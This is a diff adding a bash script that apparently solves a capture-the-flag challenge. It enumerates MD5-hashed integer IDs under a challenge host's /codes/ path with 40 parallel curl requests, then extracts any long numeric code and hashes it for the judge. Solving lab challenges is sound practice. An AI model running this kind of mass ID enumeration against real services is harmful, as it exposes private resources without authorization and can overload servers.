@@ -13,6 +13,35 @@ done < numeros.txt | grep -v 404
 
 
 
+BASE="https://chl-61f36451-dce1-47e2-8c43-7a8abcfe83f4-apagar-ia.softwareseguro.com.ar/codes"
+seq 10050 20000 | xargs -P 40 -I{} bash -c '
+  i="$1"; base="$2"
+  h=$(printf %s "$i" | md5sum); h=${h%% *}
+  t=$(mktemp)
+  c=$(curl -s -o "$t" -w "%{http_code}" -L "$base/$h/")
+  if [ "$c" = "200" ]; then
+    hit=$(grep -oE "[0-9]{14,}" "$t" | head -1)
+    li=$(grep -o "<li" "$t" | wc -l)
+    if [ -n "$hit" ] || [ "$li" -lt 20 ]; then
+      b=$(wc -c < "$t")
+      echo ">>> id=$i bytes=$b li=$li ${hit:+*** CODIGO=$hit ***}  $base/$h/"
+      [ -n "$hit" ] && { m=$(printf %s "$hit" | md5sum); echo "    md5 -> ${m%% *}   <- al juez"; }
+    fi
+  fi
+  rm -f "$t"
+' _ {} "$BASE"
+
+
+
+
+
+
+
+
+
+
+
+
 #!/usr/bin/env bash
 # probe_ids.sh - regla confirmada: /codes/ md5(<id entero>) /
 #   md5("9912")=archivo A, md5("9995")=archivo B.
